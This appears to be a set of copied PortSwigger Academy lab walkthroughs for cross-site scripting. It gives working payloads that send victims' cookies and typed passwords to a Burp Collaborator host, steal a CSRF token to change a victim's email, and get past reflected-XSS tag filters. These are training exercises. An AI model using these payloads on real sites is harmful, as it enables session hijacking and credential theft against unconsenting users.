########### https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies

Using Burp Suite Professional, go to the Collaborator tab.

Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.

Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
    <script>
    fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
    method: 'POST',
    mode: 'no-cors',
    body:document.cookie
    });
    </script>

This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain 
on the public Collaborator server.
    
Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. 
If you don't see any interactions listed, wait a few seconds and try again.
    
Take a note of the value of the victim's cookie in the POST body.
    
Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie 
with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that 
you have successfully hijacked the admin user's session, you can use the same cookie in a request to /my-account 
to load the admin user's account page.

########### https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords

Using Burp Suite Professional, go to the Collaborator tab.
    
Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.

Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
    <input name=username id=username>
    <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
    method:'POST',
    mode: 'no-cors',
    body:username.value+':'+this.value
    });">

This script will make anyone who views the comment issue a POST request containing their username and password 
to your subdomain of the public Collaborator server.
    
Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, 
wait a few seconds and try again.
    
Take a note of the value of the victim's username and password in the POST body.
    
Use the credentials to log in as the victim user.

########### https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf

Log in using the credentials provided. On your user account page, notice the function for updating your email address.
    
If you view the source for the page, you'll see the following information:
        You need to issue a POST request to /my-account/change-email, with a parameter called email.
        There's an anti-CSRF token in a hidden input called token.
    
This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address.

Submit the following payload in a blog comment:
    <script>
    var req = new XMLHttpRequest();
    req.onload = handleResponse;
    req.open('get','/my-account',true);
    req.send();
    function handleResponse() {
        var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
        var changeReq = new XMLHttpRequest();
        changeReq.open('post', '/my-account/change-email', true);
        changeReq.send('csrf='+token+'&email=test@test.com')
    };
    </script>

This will make anyone who views the comment issue a POST request to change their email address to test@test.com.

!!! From this part all of the xss method is Reflected !!!

########### https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked

Inject a standard XSS vector, such as:
<img src=1 onerror=print()>
    
Observe that this gets blocked. In the next few steps, we'll use use Burp Intruder to test which tags and attributes are being blocked.
    
Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.
    
In Burp Intruder, in the Positions tab, click "Clear §". Replace the value of the search term with: <>
    
Place the cursor between the angle brackets and click "Add §" twice, to create a payload position. The value of the search term should now look like: <§§>
    
Visit the XSS cheat sheet and click "Copy tags to clipboard".
    
In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list. Click "Start attack".
    
When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the body payload, which caused a 200 response.

Go back to the Positions tab in Burp Intruder and replace your search term with:
<body%20=1>
   
Place the cursor before the = character and click "Add §" twice, to create a payload position. The value of the search term should now look like: <body%20§§=1>
    
Visit the XSS cheat sheet and click "copy events to clipboard".
    
In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the payloads list. 
Click "Start attack".
    
When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the onresize payload, which caused a 200 response.

Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID:
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
    
Click "Store" and "Deliver exploit to victim".

########### https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked

Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID:
    <script>
    location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
    </script>
    
Click "Store" and "Deliver exploit to victim".

This injection creates a custom tag with the ID x, which contains an onfocus event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called.




